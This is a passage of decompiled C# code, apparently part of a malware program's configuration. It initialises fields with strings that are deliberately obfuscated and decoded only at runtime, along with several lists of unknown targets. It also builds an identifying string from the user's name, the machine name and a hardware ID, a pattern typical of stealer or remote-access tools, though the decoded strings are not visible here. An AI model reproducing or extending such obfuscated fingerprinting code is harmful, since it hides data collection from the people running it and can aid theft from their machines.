			hIhPBIfOSm(getString_0(107381145)),
			hIhPBIfOSm(getString_0(107381112)),
			hIhPBIfOSm(getString_0(107413327)),
			hIhPBIfOSm(getString_0(107413318)),
			hIhPBIfOSm(getString_0(107413285)),
			hIhPBIfOSm(getString_0(107413244)),
			hIhPBIfOSm(getString_0(107413171)),
			hIhPBIfOSm(getString_0(107381601)),
			hIhPBIfOSm(getString_0(107413162)),
			hIhPBIfOSm(getString_0(107381524)),
			hIhPBIfOSm(getString_0(107413129)),
			hIhPBIfOSm(getString_0(107413608)),
			hIhPBIfOSm(getString_0(107413567)),
			hIhPBIfOSm(getString_0(107413534)),
			hIhPBIfOSm(getString_0(107413461)),
			hIhPBIfOSm(getString_0(107413420)),
			hIhPBIfOSm(getString_0(107413419)),
			hIhPBIfOSm(getString_0(107413386)),
			hIhPBIfOSm(getString_0(107412833)),
			hIhPBIfOSm(getString_0(107412760)),
			hIhPBIfOSm(getString_0(107412719))
		};
		PpoSMzkyzp = new List<string>
		{
			hIhPBIfOSm(nTkHQcdXRpJsk(getString_0(107412710))),
			hIhPBIfOSm(getString_0(107412629)),
			hIhPBIfOSm(getString_0(107413048)),
			hIhPBIfOSm(getString_0(107412951)),
			hIhPBIfOSm(getString_0(107412858)),
			hIhPBIfOSm(getString_0(107412249)),
			hIhPBIfOSm(getString_0(107412188)),
			hIhPBIfOSm(getString_0(107412571)),
			hIhPBIfOSm(getString_0(107412510)),
			hIhPBIfOSm(getString_0(107412413)),
			hIhPBIfOSm(getString_0(107411808)),
			hIhPBIfOSm(getString_0(107411711)),
			hIhPBIfOSm(getString_0(107411618)),
			hIhPBIfOSm(nTkHQcdXRpJsk(getString_0(107412710)))
		};
		rbrkDaqDuTVbVK = hIhPBIfOSm(getString_0(107412033));
		WkxnuQfXvISBG = new List<string>
		{
			hIhPBIfOSm(getString_0(107411888)),
			hIhPBIfOSm(getString_0(107411182)),
			hIhPBIfOSm(getString_0(107411500)),
			hIhPBIfOSm(getString_0(107411338)),
			hIhPBIfOSm(getString_0(107410632)),
			hIhPBIfOSm(getString_0(107410950))
		};
		JmlNpNnlAKvHk = new List<string>
		{
			hIhPBIfOSm(getString_0(107410244)),
			hIhPBIfOSm(getString_0(107410183)),
			hIhPBIfOSm(getString_0(107410122))
		};
		jAgddAjehStg = getString_0(107396958);
		BBPtpBucYlVlKwqBb = getString_0(107396958);
		OcUMIfGBdfc = new DateTime(2000, 1, 1);
		cNiAqzBRlxhj = new DateTime(2100, 1, 1);
		rSpXSloFudRhsO = getString_0(107396921);
		gZpeCkfprtF = getString_0(107393006);
		tSeKVwoVFMvVF = getString_0(107396958);
		oTAWZqVEYH = getString_0(107396958);
		ukGXCjRTnkS = getString_0(107396958);
		FeZkBGbmiUtexr = getString_0(107396958);
		nMDpKOgZOyx = getString_0(107396958);
		tcOSbsOVOaUxj = getString_0(107396958);
		DBmcqQetlZqvO = new List<string>
		{
			getString_0(107396480),
			getString_0(107396194),
			getString_0(107396514),
			getString_0(107396075)
		};
		lPDturpXzJaF = getString_0(107396958);
		vTzmcFSquAlN = getString_0(107410029);
		rKOzXWNMcaTzp = getString_0(107396958);
		ezqspfsAbnsACM = getString_0(107396958);
		BLdXRwvBwSKhC = getString_0(107396958);
		eJnXTirhNcXGG = string.Empty;
		TDOMrfSRDNtwdT = getString_0(107396958);
		PnAafuBuXsz = getString_0(107396958);
		HdqChWKzdWxT = getString_0(107396958);
		CllVXTfcjWKCABEB = getString_0(107394772);
		SJzvFiWoiq = getString_0(107394772);
		mAyotAltHXJ = getString_0(107396958);
		FoGxBcmARWOs = getString_0(107396958);
		tlyZdyzkSThQ = getString_0(107396958);
		khAQEfcwJok = getString_0(107396958);
		pVUiMnuwUVO = getString_0(107396958);
		jRmkkCcUGdGeBAq = getString_0(107410056);
		dkGHyHInFAxJxO = getString_0(107396958);
		OnFqoJGUGApWdJ = getString_0(107396958);
		sxBKsWEoajXbMS = getString_0(107410519);
		AZTVUOIWwkv = getString_0(107396958);
		mRnlSpySIvHv = getString_0(107396958);
		VNxSvOlwxaeW = getString_0(107396958);
		AMEITUWPLg = getString_0(107396958);
		hccsNgdDdQ = getString_0(107410530);
		GxLQadSxyiQwS = getString_0(107396921);
		BUGsJntHGbhi = getString_0(107396958);
		zaCuMfBoZEE = getString_0(107396958);
		AdgkTwblBwipT = getString_0(107396958);
		cYsXlGDBtenOhBicM = new string[0];
		LqtEdmbXXRZ = getString_0(107396958);
		plkdLSPuoWcdl = true;
		WveMusgukyqRU = getString_0(107396958);
		TbNpXAhfsSvoF = false;
		WYYyvZugarQGbt = false;
		syqNcBhkAorgvFf = false;
		UyyQvVWUVMkr = false;
		ggXwxjUYnLoRjW = getString_0(107410485);
		zHVjUhBGwaRp = false;
		uLoneUjcNasYW = false;
		kdWGgGniuHUyqOCtL = false;
		XQCZKlShURRIWCk = false;
		YSyraIcgHbsYy = true;
		RYHlFKZKoQLN = getString_0(107410496) + Environment.UserName + getString_0(107410451) + Environment.MachineName + getString_0(107410462) + SVIZsHmxRViwKya.snRFPWIwbhbDozJy() + getString_0(107410425);
		XUkiYXGJXBcCCIV = false;
		qPWcKfeHrpD = new Stopwatch();
		XqcQqptBktg = 0;
		LyRFRlRmWuJeh = 0;
		KOZeHLOdChFnG = false;
		nxDmDrezAzMg = getString_0(107410416) + SVIZsHmxRViwKya.snRFPWIwbhbDozJy() + getString_0(107410439);
	}
}
